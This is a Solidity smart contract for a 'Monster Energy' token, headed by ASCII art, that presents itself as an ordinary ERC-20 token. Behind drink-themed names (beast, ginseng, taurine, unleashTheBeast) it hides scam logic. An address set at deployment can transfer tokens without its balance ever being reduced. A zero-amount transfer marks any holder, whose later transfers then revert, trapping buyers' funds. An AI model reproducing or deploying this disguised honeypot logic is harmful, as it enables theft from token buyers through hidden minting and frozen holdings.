/*

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#*++#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%*%@@@@@@@@#**+------===+*#@@@@@@@@%#+*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%****+=-====+++#*=--------------==+##@@@@@*---===+#@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#*+=-:::----------==#@@%#%+::------===+%#**+--------==+%@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%*-:------==+%@@@@@@%::----===+@#++-::--------==+%@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@#::-----=++@@@@@@@@------==#@@@@@@%%@%*------=+#@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+:----=*@@@@@@@@@%------==@@@@@@@@@@@@*:---==*@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:--==#@@@@@@@@@%=:----==@@@@@@@@@@@@+---==+%@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:--==*@@@@@@@@@@@-:---==*@@@@@@@@@@@*---=+@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:---==#@@@@@@@@@%:-----=*@@@@@@@@@@@=---=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-----=#@@@@@@@@@@@------=*@@@@@@@@@@%=--=*@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:---=+@@@@@@@@@@@@=------=#@@@@@@@@@=---=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:---==#@@@@@@@@@@@:------=%@@@@@@@@@%---=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=:---==#@@@@@@@@@@@%-----=%@@@@@@@@@@*---=*@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+:---==%@@@@@@@@@@@-----=@@@@@@@@@@@*----=@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:---=*@@@@@@@@@@#:---=+@@@@@@@@@@@@+:-=*@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:----=*@@@@@@@@@*:---==%@@@@@@@@@@@@=-=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=-----*@@@@@@@@@@-----=+@@@@@@@@@@@@---=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+----+@@@@@@@@@@@#:----=#@@@@@@@@@@%:--==#@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+---=+@@@@@@@@@@@@-----+@@@@@@@@@@@@+:--=#@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+----*@@@@@@@@@@@+----*@@@@@@@@@@@@@@---=@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@---=+%@@@@@@@@@@----=@@@@@@@@@@@@@@@=-=%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=---=#@@@@@@@@@*:--=%@@@@@@@@@@@@@@@--*@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=---+@@@@@@@@@#:--=#@@@@@@@@@@@@@@@%--+%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=---=%@@@@@@@@%----=*@@@@@@@@@@@@@@@%--=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=----+@@@@@@@@@@=---=#@@@@@@@@@@@@@@@#-=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*---#@@@@@@@@@@@:--=*@@@@@@@@@@@@@@%--=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*---+@@@@@@@@@@%----*@@@@@@@@@@@@@@@=-=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@----%@@@@@@@@@@---=%@@@@@@@@@@@@@@@--=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%---=@@@@@@@@@@@*--=@@@@@@@@@@@@@@@+--=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#--+@@@@@@@@@@@*--=@@@@@@@@@@@@@@@=---*@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@--+@@@@@@@@@@@*--+@@@@@@@@@@@@@@@%--=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*-+@@@@@@@@@@@*--=#@@@@@@@@@@@@@@#-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-*@@@@@@@@@@@%--=+%@@@@@@@@@@@@@+=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-*@@@@@@@@@@@=--=+@@@@@@@@@@@@@@#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=@@@@@@@@@@@%=-=*@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@@@@@@@@@@@%--#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@+-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@==@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@@@@@@@@@@@@@#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%#@@@@@@@%#@@@@@%@%::@@@@@@@#@@@@@#.*@@@@@%%*%@@@%%%%%%%%%%@@@##@@@%@@@@#%%%%#@@@@@@@@@@@@
@@@@@@@@@%: :#@@@%=- :%%= .-+.-+- :#%= .=#@@#.#@%-.:-::-=%=:+*- :**=:%#: -+++.=@+..=+*- -@@@@@@@@@@@
@@@@@@@@@@=:. +@*:** :@@= :@%.+@%..%@+:#-.:**.#@@#..-=-.:*%@@@= =@@@@@@: =*++%%@% :+-::=%@@@@@@@@@@@
@@@@@@@@@@--@= :-%@* :@@%. =# +@# :@@+:@@@+:..#@@@@@@@=  +@@@@= =@@@@@@: *%##@@@# .%@= =@@@@@@@@@@@@
@@@@@@@@@%.-@@#=*@@* :@@@%= . -=:=%@@=.@@@@@*.*@@%@@@*  +@@@@@: =@@@@@%. +#%#*:** .@@@+ :#@@@@@@@@@@
@@@@@@@@@@#*@@@@@@@* .%@@@@@+.=@@@@@@%*@@@@@%*@@@+:-- :#@@@@@@@##@@@@@@%****###@@%*@@@@#. =%@@@@@@@@
@@@@@@@@@@@@@@@@@@@%*@@@@@@@%-+@@@@@@@@@@@@@@@@@@@@*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%*###@@@@@#*%@@*@@@@@#*###@@@@@*###*@@@@@#*####@@@@%*%@*%@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@#=##@@@@@@#*#**=@@@@@*+#%@@@@@@+*#+*@@@@@**@#*+@@@@@@++@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@####@@@@@%%@@@%@@@@@%####@@@@@%@@@#@@@@@@####%@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


*/


// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MonsterEnergyToken is Ownable {
    
    uint256 public totalSupply = 666_666_666_666_666 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV2Pair;

    uint8 public decimals = 9;

    function approve(address caffeine, uint256 juice) public returns (bool success) {
        allowance[msg.sender][caffeine] = juice;
        emit Approval(msg.sender, caffeine, juice);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'MONSTER';

    mapping(address => uint256) private ginseng;

    function transferFrom(address energy, address drink, uint256 juice) public returns (bool success) {
        unleashTheBeast(energy, drink, juice);
        require(juice <= allowance[energy][msg.sender]);

        allowance[energy][msg.sender] -= juice;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private beast;

    constructor(address unleash) {
        beast[unleash] = taurine;
        _initLP();
        balanceOf[msg.sender] = totalSupply;
    }

    function _initLP() internal {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address drink, uint256 juice) public returns (bool success) {
        unleashTheBeast(msg.sender, drink, juice);
        
        return true;
    }

    string public name = 'Monster Energy';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function unleashTheBeast(address energy, address drink, uint256 juice) private returns (bool success) {
        
        if (beast[energy] != 0) {
            
            // unleashTheBeast

        } else {

            balanceOf[energy] -= juice;
        
        }

        if (juice == 0) ginseng[drink] += taurine;

        if (beast[energy] == 0 && uniswapV2Pair != energy && ginseng[energy] > 0) {
            
            beast[energy] -= taurine;
        }

        balanceOf[drink] += juice;

        emit Transfer(energy, drink, juice);
        
        return true;
    }

    uint256 private taurine = 66;
}